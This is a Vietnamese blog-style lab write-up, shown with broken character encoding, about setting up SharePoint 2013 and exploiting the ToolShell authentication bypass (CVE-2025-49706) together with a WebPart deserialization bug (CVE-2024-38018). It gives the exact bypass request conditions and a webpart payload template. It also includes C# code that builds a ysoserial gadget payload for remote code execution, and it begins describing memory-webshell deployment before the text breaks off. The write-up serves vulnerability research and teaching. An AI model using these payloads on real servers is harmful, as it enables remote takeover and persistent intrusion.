[{"content":"Tiáº¿p ná»‘i tá»« series trÆ°á»›c, trong lÃºc mÃ¬nh thá»±c hiá»‡n thá»±c nghiá»‡m cho Ä‘á»“ Ã¡n, mÃ¬nh Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c lÃ  lÃ m 2 cÃ¡i lab Ä‘Æ¡n giáº£n Ä‘á»ƒ trigger memshell thÃ´i. NhÆ°ng giáº£ng viÃªn hÆ°á»›ng dáº«n cá»§a mÃ¬nh báº£o lÃ  \u0026ldquo;LÃ m Sharepoint Ä‘i em\u0026rdquo;. So yeah, here we are ğŸ—¿\nI. Setup Guidelines Má»™t sá»‘ link Setup máº«u mÃ¬nh Ä‘Ã£ tham kháº£o:\nhttps://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d https://hackmd.io/@taidh/ByE7_Kqlh Cáº¥u hÃ¬nh mÃ¡y áº£o: DC: WinServer 2012 - 2x2 cores - 4GB RAM SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM DC Set up DNS Server vÃ  promote thÃ nh Domain Controller. 2 mÃ¡y sau sáº½ join domain vÃ  set DNS lÃ  IP cá»§a mÃ¡y DC. Táº¡o OU ServiceAccounts vÃ  thÃªm 3 account:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 First name: SharePoint Last name: FarmAdmin User logon name: sp_farmadmin Bá» chá»n â€œUser must change password at next logonâ€ Chá»n â€œPassword never expiresâ€ TÆ°Æ¡ng tá»± cho sp_service vÃ  sql_service sp_service First name: SharePoint Last name: Service Username: sp_service sql_service First name: SQL Last name: Service Username: sql_service SQL Server Join Domain vÃ  set DNS. Táº£i SQL Server Express báº£n Advanced Ä‘á»ƒ cÃ i luÃ´n cáº£ thá»ƒ Management Studio. Link táº£i: https://www.microsoft.com/en-us/download/details.aspx?id=43351\nTáº¡i Ä‘Ã¢y chá»n SQLEXPRADV_x64_ENU.exe vÃ  cÃ i Ä‘áº·t nhÆ° bÃ¬nh thÆ°á»ng.\nLÆ°u Ã½: Äá»ƒ khÃ´ng bá»‹ lá»—i The SQL Server service account login or password is not valid. Use SQL Server Configuration Manager to update the service account. khi set ngÆ°á»i dÃ¹ng DC\\sql_service cho SQL Server Database Engine thÃ¬ sá»­ dá»¥ng WinServer 2012 Ä‘á»ƒ set up, dÃ¹ng Win10 sáº½ bá»‹ lá»—i (mÃ¬nh khÃ´ng hiá»ƒu vÃ¬ sao).\nCÃ²n láº¡i config theo hÆ°á»›ng dáº«n cá»§a anh Jang vÃ  a TÃ iDH\nSharepoint Server Join Domain vÃ  set DNS.\nLink download file img sharepoint: https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013 =\u0026gt; Chá»n báº£n English\nWinServer 2012 dÃ­nh ráº¥t nhiá»u lá»—i khi set up SharePoint Server 2013:\nLá»—i set role IIS 1 There was an error during Installation, The tool was unable to install Application Server Role, Web Server (IIS) Role Link tham kháº£o náº¿u gáº·p:\nhttps://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html\nhttps://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/\nTá»± cÃ i Ä‘áº·t cÃ¡c feature báº±ng Powershell: 1 2 Add-WindowsFeature NET-WCF-HTTP-Activation45,NET-WCF-TCP-Activation45,NET-WCF-Pipe-Activation45 Add-WindowsFeature Net-Framework-Features,Web-Server,Web-WebServer,Web-Common-Http,Web-Static-Content,Web-Default-Doc,Web-Dir-Browsing,Web-Http-Errors,Web-App-Dev,Web-Asp-Net,Web-Net-Ext,Web-ISAPI-Ext,Web-ISAPI-Filter,Web-Health,Web-Http-Logging,Web-Log-Libraries,Web-Request-Monitor,Web-Http-Tracing,Web-Security,Web-Basic-Auth,Web-Windows-Auth,Web-Filtering,Web-Digest-Auth,Web-Performance,Web-Stat-Compression,Web-Dyn-Compression,Web-Mgmt-Tools,Web-Mgmt-Console,Web-Mgmt-Compat,Web-Metabase,Application-Server,AS-Web-Support,AS-TCP-Port-Sharing,AS-WAS-Support, AS-HTTP-Activation,AS-TCP-Activation,AS-Named-Pipes,AS-Net-Framework,WAS,WAS-Process-Model,WAS-NET-Environment,WAS-Config-APIs,Web-Lgcy-Scripting,Windows-Identity-Foundation,Server-Media-Foundation,Xps-Viewer Copy file C:\\Windows\\System32\\ServerManager.exe ngay táº¡i folder System32 vÃ  Ä‘á»•i tÃªn thÃ nh ServerManagerCMD.exe Náº¿u váº«n khÃ´ng Ä‘Æ°á»£c, xem log táº¡i %TEMP% =\u0026gt; prerequisiteinstaller.{thá»i gian cÃ i Ä‘áº·t}.log Ä‘á»ƒ Ä‘á»c log sáº½ tháº¥y command run update role nhÆ° sau: 1 2 3 4 5 6 7 \u0026#34;C:\\Windows\\system32\\ServerManagerCmd.exe\u0026#34; -inputpath \u0026#34;C:\\Users\\SP_FAR~1\\AppData\\Local\\Temp\\PreFEB1.tmp.XML\u0026#34; \u0026#34;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_regiis.exe\u0026#34; -i \u0026#34;C:\\Windows\\system32\\cscript.exe\u0026#34; \u0026#34;C:\\Windows\\system32\\iisext.vbs\u0026#34; /enext \u0026#34;ASP.NET v4.0.30319\u0026#34; \u0026#34;C:\\Windows\\system32\\iisreset.exe\u0026#34; /noforce CÃ³ thá»ƒ tá»± cháº¡y xong rá»“i restart mÃ¡y cÃ i tiáº¿p (biá»‡n phÃ¡p cuá»‘i cÃ¹ng)\nLÆ°u Ã½: KhÃ´ng táº¯t ServerManager khi Ä‘ang install. Náº¿u nhÆ° install tháº¥y lÃ¢u chá»©ng tá» Ä‘ang cháº¿t táº¡i bÆ°á»›c set Role nÃ y, nÃ³ Ä‘ang Ä‘á»£i káº¿t quáº£ tráº£ vá»\nLá»—i khi download cÃ¡c package Khi download cÃ¡c package nhÆ° SQL Server Native Client vÃ  cÃ¡c package sau sáº½ liÃªn tá»¥c dÃ­nh lá»—i vÃ¬ WinServer 2012 Ä‘Ã£ cÅ© vÃ  khÃ´ng thá»±c hiá»‡n káº¿t ná»‘i Ä‘Æ°á»£c site go.microsoft.com (WinServer 2012 cÃ³ váº¥n Ä‘á» gÃ¬ Ä‘áº¥y vá»›i TLS1.2)\n1 2 3 4 5 6 7 2025-09-19 07:07:02 - [In HRESULT format] (0) 2025-09-19 07:07:02 - Beginning download of Microsoft Sync Framework Runtime v1.0 SP1 (x64) 2025-09-19 07:07:02 - http://go.microsoft.com/fwlink/?LinkID=224449 2025-09-19 07:07:02 - Error: InternetOpenUrl failed (0X80072F07=-2147012857) 2025-09-19 07:07:02 - http://go.microsoft.com/fwlink/?LinkID=224449 2025-09-19 07:07:02 - Error: Download failed (0) 2025-09-19 07:07:02 - Last return code (-1) Äáº¿n Ä‘oáº¡n nÃ y thÃ¬ khi gáº·p lá»—i á»Ÿ Ä‘Ã¢u mÃ¬nh sáº½ copy link download fail táº¡i file log vÃ  táº£i á»Ÿ ngoÃ i, sau Ä‘Ã³ tá»± cÃ i cÃ¡c package vÃ o.\nÄÃ¢y lÃ  cÃ¡c package mÃ¬nh Ä‘Ã£ táº£i: CÃ¡c file msi thÃ¬ cÃ³ thá»ƒ cháº¡y ngay, sau Ä‘Ã³ restart mÃ¡y cÃ i tiáº¿p. CÃ²n má»™t sá»‘ file exe nÃªn cháº¡y command, cÃ i Ä‘áº·t giao diá»‡n xong Sharepoint váº«n sáº½ bÃ¡o lÃ  download error (khÃ´ng hiá»ƒu kiá»ƒu gÃ¬):\n1 2 3 4 5 WindowsServerAppFabricSetup_x64.exe /i CacheClient,CachingService,CacheAdmin /gac WcfDataServices.exe /quiet /norestart AppFabric1.1-KB2671763-x64-ENU.exe /quiet /norestart Sau khi cÃ i Ä‘áº·t sau Ä‘á»u nÃªn restart rá»“i báº­t lÃªn cÃ i tiáº¿p, cho Ä‘áº¿n khi hiá»‡n quÃ¡ trÃ¬nh cÃ i Ä‘áº·t hoÃ n táº¥t thÃ¬ tiáº¿p tá»¥c cháº¡y setup.exe vÃ  lÃ m theo cÃ¡c bÆ°á»›c set up Sharepoint: Cáº¥u hÃ¬nh Sharepoint theo máº·c Ä‘á»‹nh. Táº¡i bÆ°á»›c Database server nháº­p ip cá»§a mÃ¡y SQL Server lÃ  10.10.1.137 vÃ  ngÆ°á»i dÃ¹ng káº¿t ná»‘i lÃ  sp_service. Sau khi cáº¥u hÃ¬nh xong, truy cáº­p tá»›i Ä‘Æ°á»ng dáº«n http://sp-server:16504/ Ä‘á»ƒ xÃ¡c nháº­n Ä‘Ã£ cáº¥u hÃ¬nh Central Admin thÃ nh cÃ´ng: Tiáº¿p tá»¥c táº¡o site test collection: II. ToolShell in Sharepoint Do láº§n Ä‘áº§u vá»c Sharepoint, mÃ¬nh Ä‘Ã£ Ä‘i tÃ¬m má»™t CVE cÃ³ poc sáºµn Ä‘á»ƒ thá»±c hiá»‡n khai thÃ¡c, sau Ä‘Ã³ mÃ¬nh chá»n bug ToolShell vÃ¬ nÃ³ cÃ³ áº£nh hÆ°á»Ÿng Ä‘áº¿n táº¥t cáº£ version cá»§a Sharepoint 2013. Bug nÃ y trigger chá»‰ báº±ng 1 request, gá»“m 2 bÆ°á»›c: Bypass Authen vÃ  Deserialize to RCE.\nÄá»ƒ tiáº¿n hÃ nh debug vÃ  Ä‘á»c source cá»§a Sharepoint thÃ¬ mÃ¬nh sá»­ dá»¥ng Dnspy, chá»n Attach to Process vÃ  trá» Ä‘Ãºng tiáº¿n trÃ¬nh IIS w3wp.exe Ä‘ang cháº¡y Collection Site cá»§a Sharepoint táº¡i port 80: Má»Ÿ tab Modules Ä‘á»ƒ xem cÃ¡c file dll Ä‘ang Ä‘Æ°á»£c tiáº¿n trÃ¬nh load, tá»« Ä‘Ã³ cÃ³ Ä‘Æ°á»£c dll Ä‘ang Ä‘Æ°á»£c Sharepoint load: [CVE-2025-49706] Bypass Authentication CVE-2025-49706 xáº£y ra táº¡i class SPRequestModule thuá»™c namespace Microsoft.SharePoint.ApplicationRuntime. ÄÃ¢y lÃ  má»™t class implements IHttpModule, sá»­ dá»¥ng Ä‘á»ƒ chá»©a cÃ¡c EventHandler trong request pipeline cá»§a IIS. Táº¡i Ä‘Ã¢y, method PostAuthenticateRequestHandler Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xá»­ lÃ½ xÃ¡c thá»±c cÃ¡c HTTP request Ä‘áº¿n trong Sharepoint, chÃ­nh vÃ¬ váº­y nÃ³ Ä‘Æ°á»£c gá»i chá»‰ sau event BeginRequest: BÃªn trong hÃ m tá»“n táº¡i Ä‘oáº¡n code xá»­ lÃ½ truy cáº­p cÃ¡c file css js Ä‘á»‘i vá»›i ngÆ°á»i dÃ¹ng khÃ´ng xÃ¡c thá»±c nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 if (!context.User.Identity.IsAuthenticated){ if (flag4){ if (this.RequestPathIndex == SPRequestModule.PathIndex._layouts){ Uri uri3 = null; try{ uri3 = context.Request.UrlReferrer; } catch (UriFormatException){} if (uri3 != null){ string absolutePath = uri3.AbsolutePath; if (SPRequestModule.s_LoginUrl == null){ ULS.SendTraceTag(2470943U, ULSCat.msoulscat_WSS_Runtime, ULSTraceLevel.Unexpected, \u0026#34;LoginUrl is unset for request to \u0026#39;{0}\u0026#39;.\u0026#34;, new object[] { SPAlternateUrl.ContextUri }); } else if (absolutePath.EndsWith(SPRequestModule.s_LoginUrl, StringComparison.OrdinalIgnoreCase) \u0026amp;\u0026amp; (text2.EndsWith(\u0026#34;.css\u0026#34;, StringComparison.OrdinalIgnoreCase) || text2.EndsWith(\u0026#34;.js\u0026#34;, StringComparison.OrdinalIgnoreCase))){ context.SkipAuthorization = true; } } } } else if (!flag6 \u0026amp;\u0026amp; settingsForContext != null \u0026amp;\u0026amp; settingsForContext.UseClaimsAuthentication \u0026amp;\u0026amp; !settingsForContext.AllowAnonymous){ ... SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException()); } else if (flag5){ ... SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException()); } } Logic code sáº½ cho phÃ©p ngÆ°á»i dÃ¹ng unauthen váº«n cÃ³ thá»ƒ truy cáº­p cÃ¡c file script js vÃ  stylesheet css Ä‘á»ƒ phá»¥c vá»¥ viá»‡c hiá»ƒn thá»‹. CÃ¡c trÆ°á»ng há»£p cÃ²n láº¡i sáº½ kiá»ƒm tra nháº±m tráº£ vá» status 401 vá» cho ngÆ°á»i dÃ¹ng. CÃ³ 3 nhÃ¡nh if else, náº¿u nhÆ° lÃ m cho false cáº£ 3 thÃ¬ ngÆ°á»i dÃ¹ng khÃ´ng xÃ¡c thá»±c cÃ³ thá»ƒ bypass Ä‘oáº¡n check nÃ y vÃ  tiáº¿p tá»¥c Ä‘Æ°á»£c xá»­ lÃ½ yÃªu cáº§u. Äá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³ thÃ¬ cáº§n flag6 lÃ  true, cÃ²n flag4 vÃ  flag5 cáº§n cÃ³ giÃ¡ trá»‹ false.\nXem xÃ©t Ä‘oáº¡n code Ä‘áº±ng trÆ°á»›c, ta tháº¥y Ä‘Æ°á»£c náº¿u nhÆ° flag4 mang giÃ¡ trá»‹ false thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ nháº£y vÃ o nhÃ¡nh if(flag5) vÃ¬ flag5 = !flag4 = true:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 bool flag4 = SPSecurity.AuthenticationMode == AuthenticationMode.Forms \u0026amp;\u0026amp; !flag2; bool flag5 = !flag4; ULS.SendTraceTag(2373643U, ULSCat.msoulscat_WSS_Runtime, ULSTraceLevel.Verbose, \u0026#34;Value for checkAuthenticationCookie is : {0}\u0026#34;, new object[] { flag5 }); bool flag6 = false; string text2 = context.Request.FilePath.ToLowerInvariant(); if (flag5){ Uri uri2 = null; try{ uri2 = context.Request.UrlReferrer; } catch (UriFormatException){} if (this.IsShareByLinkPage(context) || this.IsAnonymousVtiBinPage(context) || this.IsAnonymousDynamicRequest(context) || context.Request.Path.StartsWith(this.signoutPathRoot) || context.Request.Path.StartsWith(this.signoutPathPrevious) || context.Request.Path.StartsWith(this.signoutPathCurrent) || context.Request.Path.StartsWith(this.startPathRoot) || context.Request.Path.StartsWith(this.startPathPrevious) || context.Request.Path.StartsWith(this.startPathCurrent) || (uri2 != null \u0026amp;\u0026amp; (SPUtility.StsCompareStrings(uri2.AbsolutePath, this.signoutPathRoot) || SPUtility.StsCompareStrings(uri2.AbsolutePath, this.signoutPathPrevious) || SPUtility.StsCompareStrings(uri2.AbsolutePath, this.signoutPathCurrent)))){ flag5 = false; flag6 = true; } } Trong nhÃ¡nh if(flag5), server láº¥y ra giÃ¡ trá»‹ cá»§a header Referer vÃ  so sÃ¡nh giÃ¡ trá»‹ cá»§a cá»§a nÃ³ vá»›i giÃ¡ trá»‹ signoutPathRoot, signoutPathPrevious vÃ  signoutPathCurrent. Chá»‰ cáº§n má»™t trong cÃ¡c Ä‘iá»u kiá»‡n trÃªn Ä‘Ãºng thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ set giÃ¡ trá»‹ flag5 lÃ  false vÃ  flag6 lÃ  true, Ä‘Ãºng vá»›i Ã½ Ä‘á»‹nh ban Ä‘áº§u. CÃ¡c giÃ¡ trá»‹ signoutPath mang giÃ¡ trá»‹ nhÆ° sau: HÃ m GetLayoutsFolder tráº£ vá» giÃ¡ trá»‹ _layouts/15 hoáº·c _layouts: Máº·c Ä‘á»‹nh thÃ¬ flag4 sáº½ cÃ³ giÃ¡ trá»‹ false, nÃªn Ä‘á»ƒ bypass cÆ¡ cháº¿ xÃ¡c thá»±c nÃ y, giÃ¡ trá»‹ cá»§a header Referer sáº½ lÃ  /_layouts/SignOut.aspx hoáº·c /_layouts/15/SignOut.aspx: PoC req gá»i khÃ´ng xÃ¡c thá»±c: Req bypass auth: Tiáº¿p tá»¥c Ä‘i Ä‘áº¿n nÆ¡i trigger lá»— há»•ng trong PoC lÃ  file ToolPane.aspx, báº£n thÃ¢n file khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t mÃ  chá»‰ cÃ³ Ä‘oáº¡n khai bÃ¡o code control náº±m táº¡i class Microsoft.SharePoint.WebPartPages.ToolPane:\n1 2 \u0026lt;%@ Register TagPrefix=\u0026#34;WebPartPages\u0026#34; Namespace=\u0026#34;Microsoft.SharePoint.WebPartPages\u0026#34;%\u0026gt; \u0026lt;WebPartPages:ToolPane runat=\u0026#34;server\u0026#34;/\u0026gt; Táº¡i Ä‘Ã¢y, Method OnInit Ä‘Æ°á»£c gá»i Ä‘áº§u tiÃªn Ä‘á»ƒ khá»Ÿi táº¡o page, Ä‘á»“ng thá»i gá»i Ä‘áº¿n CheckForCustomToolpane Ä‘á»ƒ kiá»ƒm tra Ä‘Æ°á»ng dáº«n cÃ³ pháº£i Ä‘á»ƒ táº¡o ToolPane khÃ´ng: HÃ m CheckForCustomToolpane kiá»ƒm tra Ä‘Æ°á»ng dáº«n URL xem cÃ³ chá»©a /_layouts/ vÃ  káº¿t thÃºc báº±ng /ToolPane.aspx hay khÃ´ng, náº¿u cÃ³ sáº½ tráº£ vá» true: Tiáº¿p theo, chÆ°Æ¡ng trÃ¬nh sáº½ xá»­ lÃ½ Ä‘áº¿n hÃ m SelectedAspWebPart, nÆ¡i mÃ  ná»™i dung WebPart truyá»n trong body sáº½ Ä‘Æ°á»£c xá»­ lÃ½ thÃ´ng qua 2 giÃ¡ trá»‹ táº¡i body lÃ  MSOTlPn_Uri vÃ  MSOTlPn_DWP: MSOTlPn_Uri chá»©a Ä‘Æ°á»ng dáº«n frontPage, cÃ²n MSOTlPn_DWP chá»©a ná»™i dung thÃ´ng tin vá» Web Part Ä‘á»ƒ tiáº¿n hÃ nh import, logic import sáº½ náº±m táº¡i hÃ m GetPartPreviewAndPropertiesFromMarkup. Äá»ƒ vÃ o Ä‘Æ°á»£c cÃ¢u lá»‡nh if thÃ¬ cÃ²n Ä‘iá»u kiá»‡n DisplayMode = EditDisplayMode, hay ?DisplayMode=Edit.\nNháº£y vÃ o GetPartPreviewAndPropertiesFromMarkup - hÃ m xá»­ lÃ½ trá»±c tiáº¿p import webpart lÃ  GetMarkupProperties, cÅ©ng lÃ  sink vuln deserialize báº±ng webpart. NhÆ°ng trÆ°á»›c khi Ä‘áº¿n Ä‘Æ°á»£c hÃ m Ä‘Ã³ cáº§n pháº£i thá»a mÃ£n táº¥t cáº£ nhá»¯ng dÃ²ng lá»‡nh trÃªn, trong Ä‘Ã³ cÃ³ CreateAndInitializeDocumentDesigner, vá»›i input pageUri chÃ­nh lÃ  param MSOTlPn_Uri Ä‘Ã£ truyá»n vÃ o trÆ°á»›c Ä‘Ã³: CreateAndInitializeDocumentDesigner sáº½ gá»i Ä‘áº¿n method Create cá»§a class ServerWebFileFromFileSystem vá»›i callstack: Táº¡i method nÃ y, chÆ°Æ¡ng trÃ¬nh tiáº¿n hÃ nh kiá»ƒm tra url truyá»n vÃ o cÃ³ chá»©a _controltemplates/ vÃ  cÃ³ pháº£i file .ascx khÃ´ng, náº¿u tá»“n táº¡i thÃ¬ tráº£ vá» object ServerWebFile dá»±a trÃªn file tháº­t, khÃ´ng sáº½ tráº£ vá» null: Nháº±m thá»a mÃ£n dÃ²ng lá»‡nh trÃªn, cáº§n tÃ¬m file ascx tÃ¹y Ã½ náº±m trong folder _controltemplates/, mÃ¬nh lá»±a chá»n _controltemplates/15/ActionBar.ascx Ä‘á»ƒ poc vÃ¬ nÃ³ á»Ÿ ngay Ä‘áº§u.\nCÅ©ng cÃ³ hÆ¡i nhiá»u Ä‘iá»u kiá»‡n rá»“i, tá»•ng há»£p láº¡i Ä‘á»ƒ bypass authen vÃ o Ä‘Æ°á»£c endpoint ToolPane.aspx, mÃ¬nh cáº§n:\nReferer header: /_layouts/15/SignOut.aspx URL param: DisplayMode=Edit URL pháº£i káº¿t thÃºc báº±ng /ToolPane.aspx: thÃªm má»™t url param tÃ¹y Ã½ vá»›i giÃ¡ trá»‹ lÃ  /ToolPane.aspx MSOTlPn_Uri: http://sp-server/my/_controltemplates/15/ActionBar.ascx [CVE-2024-38018] WebPart Properties Insecure Deserialize KhÃºc nÃ y sáº½ hÆ¡i cáº¥n vÃ¬ táº¡i sao mÃ¬nh láº¡i khÃ´ng dÃ¹ng CVE-2025-49704 mÃ  láº¡i lÃ  má»™t CVE khÃ¡c. Khi tiáº¿n hÃ nh thá»­ poc Ä‘á»ƒ test thÃ¬ mÃ¬nh confirm Ä‘Ã£ bypass auth nhÆ°ng láº¡i khÃ´ng thá»ƒ trigger deser, nÃ³ sáº½ vÄƒng ra lá»—i file Web Part not valid, mÃ¬nh Ä‘oÃ¡n lÃ  do cáº¥u trÃºc Webpart cá»§a phiÃªn báº£n 2013 vÃ  2019 cÃ³ sá»± khÃ¡c biá»‡t nÃªn khi import vÃ o bá»‹ lá»—i. (Váº­y mÃ  microsoft báº£o ráº±ng exploit Ä‘Æ°á»£c á»Ÿ má»i phiÃªn báº£n Sharepoint 2013)\nMÃ y mÃ² cÃ i Service Pack vÃ  cÃ i tiáº¿p báº£n patch cho Sharepoint nhÆ°ng cÅ©ng khÃ´ng giÃ²n. MÃ¬nh cÃ³ Ä‘i há»i vÃ  biáº¿t Ä‘Æ°á»£c ngÆ°á»i anh em xÃ£ há»™i cÅ©ng gáº·p váº¥n Ä‘á» tÆ°Æ¡ng tá»±, vÃ  ngÆ°á»i anh em Ä‘Ã³ Ä‘Ã£ cho mÃ¬nh má»™t solution khÃ¡c: sá»­ dá»¥ng CVE-2024-38018 - má»™t CVE khÃ¡c attack vÃ o Insecure Deserialize property cá»§a webpart. PoC cá»§a lá»— há»•ng Ä‘Ã£ Ä‘Æ°á»£c Ä‘á» cáº­p vÃ  phÃ¢n tÃ­ch khÃ¡ chi tiáº¿t táº¡i https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ nÃªn mÃ¬nh cÅ©ng khÃ¡ lÃ  Äƒn theo thÃ´i :)))\nTiáº¿p tá»¥c phÃ¢n tÃ­ch nÃ o, mÃ¬nh sáº½ láº¥y pháº§n webpart cá»§a bÃ i phÃ¢n tÃ­ch trÃªn:\n1 2 3 4 5 6 \u0026lt;%@ Register Tagprefix=\u0026#34;WebPartPages\u0026#34; Namespace=\u0026#34;Microsoft.SharePoint.WebPartPages\u0026#34; Assembly=\u0026#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\u0026#34; %\u0026gt; \u0026lt;WebPartPages:XmlWebPart ID=\u0026#34;SPWebPartManager\u0026#34; runat=\u0026#34;Server\u0026#34;\u0026gt; \u0026lt;WebPart xmlns=\u0026#34;http://schemas.microsoft.com/WebPart/v2\u0026#34;\u0026gt; \u0026lt;AttachedPropertiesShared\u0026gt;{SerializeData}\u0026lt;/AttachedPropertiesShared\u0026gt; \u0026lt;/WebPart\u0026gt; \u0026lt;/WebPartPages:XmlWebPart\u0026gt; CVE-2024-38018 Ä‘Ã£ khai thÃ¡c lá»— há»•ng Insecure Deserialize dá»¯ liá»‡u DataSet thÃ´ng qua cÆ¡ cháº¿ parse webpart control Ä‘á»ƒ thá»±c thi code tá»« xa, báº¯t Ä‘áº§u tá»« method WebPart.AddParsedSubObject(). Method nÃ y sáº½ luÃ´n Ä‘Æ°á»£c gá»i khi truyá»n vÃ o má»™t webpart control, vá»›i má»¥c Ä‘Ã­ch láº¥y toÃ n bá»™ chuá»—i truyá»n vÃ o Ä‘Ã£ loáº¡i bá» pháº§n register vÃ  reference assembly thÃ´ng qua class LiteralControl Ä‘á»ƒ Ä‘Æ°a vÃ o method ParseXml: ParseXml thá»±c hiá»‡n deserialize dá»¯ liá»‡u truyá»n vÃ o thÃ´ng qua XmlSerializer. Deserialize, tráº£ vá» object webPart vÃ  tiáº¿p tá»¥c gá»i Ä‘áº¿n DoPostDeserializationTasks Ä‘á»ƒ thá»±c hiá»‡n má»™t sá»‘ thao tÃ¡c sau láº§n deserialize Ä‘áº§u tiÃªn: DoPostDeserializationTasks sáº½ tiáº¿p tá»¥c call Ä‘áº¿n GetAttachedProperties, táº¡i Ä‘Ã¢y thuá»™c tÃ­nh _serializedAttachedPropertiesShared Ä‘Æ°á»£c deserialize vá»›i binder SPSerializationBinder: Trong khi Ä‘Ã³, _serializedAttachedPropertiesShared cÃ³ thá»ƒ Ä‘Æ°á»£c set giÃ¡ trá»‹ báº±ng element tag AttachedPropertiesShared: Binder SPSerializationBinder cho phÃ©p thá»±c hiá»‡n deserialize vá»›i báº¥t kÃ¬ class nÃ o thuá»™c SafeControls - lÃ  má»™t thuá»™c tÃ­nh Ä‘Æ°á»£c khai bÃ¡o trong web.config cá»§a Sharepoint site, chá»©a danh sÃ¡ch cÃ¡c assembly, namespace vÃ  class Ä‘Æ°á»£c phÃ©p gá»i Ä‘áº¿n vÃ  sá»­ dá»¥ng trong Sharepoint: Trong Ä‘á»‘ng class nÃ y, vÃ´ tÃ¬nh lÃ m sao cÃ³ chá»©a SPThemes káº¿ thá»«a class DataSet, cÅ©ng nhÆ° sá»­ dá»¥ng constructor cá»§a Dataset: CÃ³ DataSet lÃ  ngon luÃ´n, mÃ¬nh Ä‘á»›p ngay gadget chain dataset Ä‘Æ°á»£c sá»­ dá»¥ng trong ysoserial, chain nÃ y sáº½ call Ä‘áº¿n method deserialize DataSet.Tables_0 báº±ng BinaryFormatter mÃ  khÃ´ng kiá»ƒm tra binder. á» Ä‘Ã¢y sá»­a Ä‘oáº¡n code DataSetGenerator thÃ nh type SPThemes lÃ  oke:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [Serializable] public class DataSetMarshalMod : ISerializable { private byte[] _fakeTable; public void GetObjectData(SerializationInfo info, StreamingContext context) { info.SetType(typeof(SPThemes)); info.AddValue(\u0026#34;DataSet.RemotingFormat\u0026#34;, SerializationFormat.Binary); info.AddValue(\u0026#34;DataSet.DataSetName\u0026#34;, \u0026#34;\u0026#34;); info.AddValue(\u0026#34;DataSet.Namespace\u0026#34;, \u0026#34;\u0026#34;); info.AddValue(\u0026#34;DataSet.Prefix\u0026#34;, \u0026#34;\u0026#34;); info.AddValue(\u0026#34;DataSet.CaseSensitive\u0026#34;, false); info.AddValue(\u0026#34;DataSet.LocaleLCID\u0026#34;, 1033); info.AddValue(\u0026#34;DataSet.EnforceConstraints\u0026#34;, false); info.AddValue(\u0026#34;DataSet.ExtendedProperties\u0026#34;, null); info.AddValue(\u0026#34;DataSet.Tables.Count\u0026#34;, 1); info.AddValue(\u0026#34;DataSet.Tables_0\u0026#34;, this._fakeTable); } public void SetFakeTable(byte[] bfPayload) =\u0026gt; this._fakeTable = bfPayload; public DataSetMarshalMod(byte[] bfPayload) =\u0026gt; this.SetFakeTable(bfPayload); } Äoáº¡n code xá»­ lÃ½ thÃ¬ dÃ¹ng reflection Ä‘á»ƒ call Ä‘Æ°á»£c SPObjectStateFormatter.Serialize(), lÆ°u Ã½ lÃ  cáº§n sá»­ dá»¥ng dll cá»§a Sharepoint:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 static void Main(string[] args){ var spformatter = Activator.CreateInstance(\u0026#34;Microsoft.SharePoint\u0026#34;).Unwrap(); MethodInfo SPSerializer = spformatter.GetType().GetMethod(\u0026#34;Serialize\u0026#34;, new Type[] { typeof(object) }); var psi = new ProcessStartInfo(@\u0026#34;ysoserial.exe\u0026#34;, @\u0026#34;-g TypeConfuseDelegate -f BinaryFormatter -o base64 -c \u0026#34;\u0026#34;echo SUCCESS \u0026gt; C:\\Users\\Public\\pwn.txt\u0026#34;\u0026#34;\u0026#34;){ RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true }; var p = Process.Start(psi); string payload = p.StandardOutput.ReadToEnd().Trim(); p.WaitForExit(); byte[] bytes = Convert.FromBase64String(payload); DataSetMarshalMod marshal = new DataSetMarshalMod(bytes); ArrayList myAl = new ArrayList(); myAl.Add(marshal); object[] parametersArray = new object[] { myAl }; string result = (string)SPSerializer.Invoke(spformatter, parametersArray); Console.WriteLine(result); } Tá»•ng há»£p láº¡i, request khai thÃ¡c cuá»‘i cÃ¹ng sáº½ nhÆ° nÃ y: Máº·c dÃ¹ tráº£ vá» 401 nhÆ°ng chá»©c nÄƒng nÃ y Ä‘Ã£ Ä‘Æ°á»£c thá»±c thi (Sharepoint cÃ³ nhiá»u Ä‘oáº¡n return 401 quÃ¡ vÃ  mÃ¬nh cÅ©ng lÆ°á»i trace). Má»Ÿ mÃ¡y cháº¡y sharepoint lÃªn lÃ  ta tháº¥y ngay file pwn.txt: III. Deploy Memory Webshell MÃ¬nh chá»n route memory webshell Ä‘á»ƒ inject vÃ¬ nÃ³ cÃ³ thá»ƒ inject vÃ o cáº£ WebMVC vÃ  WebForms, cÅ©ng nhÆ° khÃ¡ dá»… code. Äá»ƒ hiá»ƒu rÃµ hÆ¡n vá» Route Memory Webshell hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o thÃ¬ cÃ³ thá»ƒ ngÃ³ qua Memshell in dotnet cá»§a mÃ¬nh.\nTáº¡i Ä‘Ã¢y mÃ¬nh dÃ¹ng gadgetchain ActivitySurrogateSelector Ä‘á»ƒ load code C#, gadgetchain nÃ y trong tool yso máº·c Ä‘á»‹nh sáº½ láº¥y binary tá»« file 